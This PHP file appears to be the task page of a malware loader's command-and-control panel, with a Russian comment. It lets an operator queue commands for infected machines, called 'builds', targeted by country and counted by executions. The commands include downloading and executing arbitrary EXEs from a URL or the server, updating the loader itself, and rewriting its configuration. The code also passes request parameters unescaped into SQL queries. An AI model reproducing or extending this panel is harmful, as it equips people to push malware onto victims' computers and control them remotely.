<?php

// СДЕЛАТЬ ОСТАНОВКУ ЗАДАНИЙ

echo "
    <div style='padding: 20px'>  <div style='margin-bottom: 20px'>
    <a	class='razdel' href='?act=tasks'>All list</a>
    <a	class='razdel' href='?act=tasks&add'>Add</a>
    </div>";

if (isset($_GET['del']))
{
    $db -> query("DELETE FROM `tasks` WHERE tId={$_GET['del']}");
}

if (isset($_GET['d']))
{
	$id = $_GET['d']; 	$task = $db -> query("SELECT * FROM `tasks` WHERE tId=$id") -> fetchAssoc();

 	if ($task['tState'] == "running")
 	{
 		$t['tState'] = "stopped";
 	}
    if ($task['tState'] == "stopped")
 	{
 		$t['tState'] = "running";
 	}

	$db->update('tasks', $t, "tId=$id");}

if (!isset($_GET['add']))
{
    $tasks = $db -> query('SELECT * FROM `tasks` ORDER BY tId DESC') -> fetchAllAssoc();

    echo "<table cellpadding='3' cellspacing='3' width='100%'><tr><td width='100%'>";

    echo "<table cellpadding='3' cellspacing='0' width='100%' class='light_table box' rules='all'>
            <tr><th>Command</th><th>Description</th><th>Count</th><th>Settings</th></tr>";

    $count = 0;

    foreach ($tasks as $task)
    {
        $color = $count % 2 ? "#d3e7f0" : "#ebf4f8";

        switch ($task['tState'])
        {
            case "running":
                $tcolor = "green";
                break;
            case "stopped":
                $tcolor = "red";
                break;
            case "finished":
                $tcolor = "#ffa500";
                break;
        }

        echo "<tr bgcolor='$color' onmouseover=\"this.style.background='#ffffff'\" onmouseout=\"this.style.background='$color'\">
                <td align='center'>
                    <span style='color:#808080'>Num:</span> {$task['tId']}<br>
                    <span style='color:#808080'>Name:</span> {$task['tName']}<br>
                    <span style='color:#808080'>Status:</span> <span style='color:$tcolor'>{$task['tState']}</span>
                </td>

                <td align='center'><span style='color:#808080'>Builds:</span> {$task['tBuild']}<br>
                <span style='color:#808080'>Coutries:</span> ".countryFromDB($task['tCountry1'], $task['tCountry2'], $task['tCountry3'], $task['tCountry4'])."<br>
                <span style='color:#808080'>Command:</span> {$task['tViewCommand']}<br>
                <span style='color:#808080'>Only for clean / Mark as dirty / Confirm execution</span> {$task['tOnlyForClean']} / {$task['tMarkAsDirty']} / {$task['tConfirm']}</td>

                <td align='center'>
                    <span style='color:#808080'>Need:</span> <span style='color:#ffa500'>{$task['tCount']}</span><br>
                    <span style='color:#808080'>Begin:</span> <span style='color:green'>{$task['tStartedCount']}</span><br>
                    <span style='color:#808080'>End:</span> <span style='color:black'>{$task['tFinishedCount']}</span><br>
                    <span style='color:#808080'>Bad:</span> <span style='color:red'>{$task['tFailedCount']}</span></td>

                <td align='center'>";

                if ($task['tState'] == "running")
 				{
                	echo "<a href='?act=tasks&d=".$task['tId']."'>Stop</a><br>";
                }
                if ($task['tState'] == "stopped")
			 	{
                     echo "<a href='?act=tasks&d=".$task['tId']."'>Start</a><br>";
			 	}

                echo "<a href='?act=tasks&del=".$task['tId']."'>Delete</a><br></td>
                </tr>";

        $count++;
    }
}
else
{
    $s = $db -> query("SELECT * FROM daily")->fetchAllAssoc('dayBuildId');

    echo "<form action='?act=tasks&add' method='post' enctype='multipart/form-data'>
            <table cellpadding='3' cellspacing='3' width='100%'>
                <tr>
                    <td class='td_col_zag' width='30%'>Name</td>
                    <td class='td_col_list' width='70%'><input name='tName' type='text' value=''></td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='30%'>Builds</td>
                    <td class='td_col_list' width='70%'>";

                        foreach ($s as $b => $d) echo "<input type='checkbox' name='tBuild[$b]' checked>$b&nbsp;&nbsp;";

echo "              </td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='30%'>Status</td>
                    <td class='td_col_list' width='70%'>
                        <select name='tState'><option value='running'>Working</option><option value='stopped'>Stopped</option></select>
                    </td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='30%'>Countries (<a id='aSelectAll' href='#'>All</a>)</td>
                    <td class='td_col_list' width='70%'>";

                        echo "<table class='c111'>";
                        $Countries = countryListFromDB($db);
                        foreach (array_chunk($Countries, 7, true) as $CountriesChunk)
                        {
                            echo "<tr>";
                            foreach ($CountriesChunk as $Country => $CountryPresent)
                            {
                                $check = $CountryPresent ? 'checked' : '';
                                echo "<td><nobr>
                                <input id='fi$Country' type='checkbox' name='taskCountries[$Country]' value='1' $check>
                                <label for='fi$Country'>
                                <img src='img/c/".strtolower($Country).".gif'>&nbsp;$Country</label>
                                </nobr></td>";
                            }
                            echo "</tr>";
                        }
                        echo "</table>";
                echo "</td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='30%'>Only for clean</td>
                    <td class='td_col_list' width='70%'><input type='checkbox' name='tOnlyForClean'></td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='30%'>Mark as dirty</td>
                    <td class='td_col_list' width='70%'><input type='checkbox' name='tMarkAsDirty'></td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='30%'>Executions/Count</td>
                    <td class='td_col_list' width='70%'><input name='tCount' type='text' value=''></td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='30%'>Confirm execution</td>
                    <td class='td_col_list' width='70%'><input type='checkbox' name='tConfirm' checked></td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='30%'>Command</td>
                    <td class='td_col_list' width='70%'>
                        <select class='form' name='tasktype' id='tasktype' onchange='load_task_iface();'>
                            <option value='DownloadRunExeUrl'>Download and execute EXE</option>
                            <option value='DownloadRunExeId'>Download from server and execute EXE</option>
                            <option value='DownloadUpdateMain'>Download and update loader EXE</option>
                            <option value='WriteConfigString'>Write to the config</option>
                        </select>
                    </td>
                </tr>

                <tr id='taskiface'><td class='td_col_zag' width='30%'>Link/Url</td><td class='td_col_list' width='70%'><input name='tTaskLink' type='text' size='50'></td></tr>

                <tr><td>&nbsp;</td><td><input type='submit' value='Add' name='fAdd'></td></tr>

            </table>
            </form>";

    function GetFiledByFileId($name, $id)
    {
        global $db;

        $s = $db->query("SELECT $name FROM `files` WHERE fId = '$id'")->fetchAssoc();

        return $s[$name];
    }

    if (isset($_POST['fAdd']))
    {
        switch ($_POST['tasktype'])
        {
            case "DownloadRunExeUrl":
                $command = "main.DownloadRunExeUrl(%d,\"{$_POST['tTaskLink']}\")\r\n";
                $viewcommand = "Download and execute EXE <span style='color:green'>{$_POST['tTaskLink']}</span>";
                break;

            case "DownloadRunExeId":
                $command = "main.DownloadRunExeId(%d,{$_POST['tCmdFile']})\r\n";
                $viewcommand = "Download from server and execute EXE (num,ver,name)
                <span style='color:green'>{$_POST['tCmdFile']},".GetFiledByFileId('fVer', $_POST['tCmdFile']).",".GetFiledByFileId('fName', $_POST['tCmdFile'])."</span>";
                break;

            case "DownloadUpdateMain":
                $command = "main.DownloadUpdateMain(%d,{$_POST['tCmdFile']},".GetFiledByFileId('fVer', $_POST['tCmdFile']).")\r\n";
                $viewcommand = "Download and update loader EXE (num,ver,name)
                <span style='color:green'>{$_POST['tCmdFile']},".GetFiledByFileId('fVer', $_POST['tCmdFile']).",".GetFiledByFileId('fName', $_POST['tCmdFile'])."</span>";
                break;

            case "WriteConfigString":
                $command = "main.WriteConfigString(%d,\"{$_POST['tSec']}\",\"{$_POST['tName']}\",\"{$_POST['tVal']}\")\r\n";
                $viewcommand = "Write to the config (section,variable,value)<span style='color:green'>{$_POST['tSec']},{$_POST['tName']},{$_POST['tVal']}</span>";
                break;
        }

        $Countries = countryListFromDB($db);
        foreach ($Countries as $k => $v) if (isset($_POST['taskCountries'][$k])) $TaskCountries[$k] = 1;

        foreach ($_POST['tBuild'] as $b => $c) $builds[] = $b;

        $task = array
        (
            'tName' => $_POST['tName'],
            'tPriority' => 0,
            'tBuild' => implode(', ', $builds),
            'tConfirm' => $_POST['tConfirm'] ? 'yes' : 'no',
            'tOnlyForClean' => $_POST['tOnlyForClean'] ? 'yes' : 'no',
            'tMarkAsDirty' => $_POST['tMarkAsDirty'] ? 'yes' : 'no',
            'tCount' => $_POST['tCount'],
            'tState' => $_POST['tState'],
            'tCommand' => $command,
            'tViewCommand' => $viewcommand,
            'tCountry1' => countryArrayToDB($TaskCountries),
            'tCountry2' => countryArrayToDB($TaskCountries),
            'tCountry3' => countryArrayToDB($TaskCountries),
            'tCountry4' => countryArrayToDB($TaskCountries),
            'tStartedCount' => 0,
            'tFinishedCount' => 0,
            'tFailedCount' => 0,
            'tCreateTime' => date('Y-m-d H:i:s', strtotime('now')),
        );

        if ($db -> insert('tasks', $task))
        {
            metaRefresh('?act=tasks');
        }
    }
}

?>